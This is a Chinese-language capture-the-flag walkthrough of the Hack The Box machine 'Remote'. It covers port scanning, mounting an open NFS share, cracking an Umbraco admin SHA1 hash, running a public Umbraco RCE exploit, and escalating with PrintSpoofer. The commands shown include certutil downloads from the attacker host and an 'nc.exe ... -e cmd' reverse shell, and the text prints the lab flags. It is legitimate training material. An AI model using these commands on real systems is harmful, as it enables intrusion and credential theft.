###### tags: `Hack the box` `HTB` `Medium` `Windows`

# Remote
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.187.78 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.187.78:21
Open 10.129.187.78:80
Open 10.129.187.78:111
Open 10.129.187.78:135
Open 10.129.187.78:139
Open 10.129.187.78:2049
Open 10.129.187.78:5985
Open 10.129.187.78:445
Open 10.129.187.78:47001
Open 10.129.187.78:49664
Open 10.129.187.78:49665
Open 10.129.187.78:49666
Open 10.129.187.78:49677
Open 10.129.187.78:49678
Open 10.129.187.78:49679
Open 10.129.187.78:49680

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

`ffuf`掃
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://10.129.187.78/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

Home                    [Status: 200, Size: 6703, Words: 1807, Lines: 188, Duration: 518ms]
people                  [Status: 200, Size: 6749, Words: 2109, Lines: 168, Duration: 3379ms]
product                 [Status: 500, Size: 3420, Words: 774, Lines: 81, Duration: 3368ms]
blog                    [Status: 200, Size: 5011, Words: 1249, Lines: 138, Duration: 5962ms]
products                [Status: 200, Size: 5338, Words: 1307, Lines: 130, Duration: 5974ms]
contact                 [Status: 200, Size: 7890, Words: 828, Lines: 125, Duration: 7077ms]
Products                [Status: 200, Size: 5338, Words: 1307, Lines: 130, Duration: 484ms]
Contact                 [Status: 200, Size: 7890, Words: 828, Lines: 125, Duration: 485ms]
install                 [Status: 302, Size: 126, Words: 6, Lines: 4, Duration: 641ms]
Blog                    [Status: 200, Size: 5011, Words: 1249, Lines: 138, Duration: 486ms]
People                  [Status: 200, Size: 6749, Words: 2109, Lines: 168, Duration: 825ms]
about-us                [Status: 200, Size: 5451, Words: 1232, Lines: 162, Duration: 7511ms]
Product                 [Status: 500, Size: 3420, Words: 774, Lines: 81, Duration: 559ms]
INSTALL                 [Status: 302, Size: 126, Words: 6, Lines: 4, Duration: 480ms]
master                  [Status: 500, Size: 3420, Words: 774, Lines: 81, Duration: 522ms]
1112                    [Status: 200, Size: 4051, Words: 889, Lines: 124, Duration: 520ms]
intranet                [Status: 200, Size: 3313, Words: 683, Lines: 117, Duration: 484ms]
1114                    [Status: 200, Size: 4236, Words: 916, Lines: 124, Duration: 501ms]
1117                    [Status: 200, Size: 2750, Words: 506, Lines: 82, Duration: 1063ms]
...
```

前往`http://10.129.187.78/install`會重導向到`http://10.129.187.78/umbraco/#/login`
可以再看看`rustscan`的結果有`2049port`，google搜尋之後可以找到[Exploiting a Misconfigured NFS Share](https://medium.com/r3d-buck3t/exploiting-a-misconfigured-nfs-share-5a7e01e7a42f)跟[NFS (Network File System)](https://hackviser.com/tactics/pentesting/services/nfs)

查看`showmount`可以找到`/site_backups`，可以把他`mount`起來看看
```
┌──(kali㉿kali)-[~/htb]
└─$ showmount -e 10.129.187.78
Export list for 10.129.187.78:
/site_backups (everyone)

┌──(kali㉿kali)-[/mnt]
└─$ sudo mkdir -p nfs

┌──(kali㉿kali)-[/mnt]
└─$ sudo mount -o nolock 10.129.187.78:/ /mnt/nfs
```

`mount`起來可以再google一下[Umbraco的credential](https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials)
他說會存在`/App_Data/Umbraco.sdf`
```
┌──(kali㉿kali)-[/mnt/nfs/site_backups/App_Data]
└─$ ls
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
```

但好像很多東西都打不開，嘗試用`strings`尋找密碼
```
┌──(kali㉿kali)-[/mnt/nfs/site_backups/App_Data]
└─$ strings Umbraco.sdf | grep password
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
passwordConfig

┌──(kali㉿kali)-[/mnt/nfs/site_backups/App_Data]
└─$ strings Umbraco.sdf | grep admin   
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/saveupdating SessionTimeout, SecurityStamp, CreateDate, UpdateDate, Id, HasIdentity
```

可以看到有一個hash，用[Crackstation](https://crackstation.net/)
```
b8be16afba8c314ad33d812f22a04991b90e2aaa
```

|Hash                                    |Type              |Result         |
|----------------------------------------|------------------|---------------|
|b8be16afba8c314ad33d812f22a04991b90e2aaa|sha1              |baconandcheese |

尋找可用的`exploit`，找到[edb-49488](https://github.com/Jonoans/Umbraco-RCE)，使用後可到`C:\Users\Public\Desktop`得user.txt
```
┌──(kali㉿kali)-[~/htb/Umbraco-RCE]
└─$ python3 exploit.py -u admin@htb.local -p baconandcheese -w http://10.129.187.78/ -i 10.10.14.36

[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.129.187.78 on port 49740
[+] Trying to bind to :: on port 4445: Done
[+] Waiting for connections on :::4445: Got connection from ::ffff:10.129.187.78 on port 49741
[*] Logging in at http://10.129.187.78//umbraco/backoffice/UmbracoApi/Authentication/PostLogin
[*] Exploiting at http://10.129.187.78//umbraco/developer/Xslt/xsltVisualize.aspx
[*] Switching to interactive mode
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool

PS C:\Users\Public\Desktop> type user.txt
5dbc2775a858ae5700f39c597d114cd6
```

查看`whoami /priv`，發現有`SeImpersonatePrivilege`，嘗試`PrintSpoofer`
```
PS C:\USers\Public\dEsktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

PS C:\USers\Public\dEsktop> certutil.exe -urlcache -f http://10.10.14.36/PrintSpoofer64.exe PrintSpoofer.exe

PS C:\USers\Public\dEsktop> certutil.exe -urlcache -f http://10.10.14.36/nc.exe nc.exe
```

開`nc`，執行後等反彈，可在`C:\Users\Administrator\Desktop`得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4447

PS C:\USers\Public\dEsktop> ./PrintSpoofer.exe -i -c "C:\Users\Public\Desktop\nc.exe 10.10.14.36 4447 -e cmd"

C:\Users\Administrator\Desktop>type root.txt
cbd0371c29d9c81094b1c3f20ab98cc0
```
